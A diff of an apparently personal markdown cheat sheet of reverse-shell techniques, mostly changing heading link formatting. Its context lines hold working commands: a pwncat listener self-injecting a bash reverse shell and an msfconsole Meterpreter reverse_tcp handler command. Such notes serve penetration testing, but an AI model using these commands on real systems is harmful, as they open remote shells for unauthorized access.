@@ -9,12 +9,12 @@
 - [[#Netcat]]
 - [[#Java]]
 - [[#xterm]]
-- [[#pwncat]]
+- [[#Pwncat]]
 - [[#msfconsole]]
-- [[#powercat]]
+- [[#Powercat]]
 
 
-### Bash
+### [[Bash]]
 
 Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) (this was tested on Ubuntu 10.10):
 
@@ -78,20 +78,20 @@ p.waitFor()
 
 [Untested submission from anonymous reader]
 
-### Pwncat
+### [[Pwncat]]
 
 ```bash
 pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445+3
 ```
 
-[[Pwncat]]
+
 
 ### msfconsole
 ```bash
 msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.10; set lport 9009; exploit"
 ```
 
-### Powercat
+### [[Powercat]]
 **Listener + client**
 
 ```powershell
@@ -102,7 +102,7 @@ Basic Listener:
 
 ```
 
-[[Powercat]]
+
 
 ### xterm
 
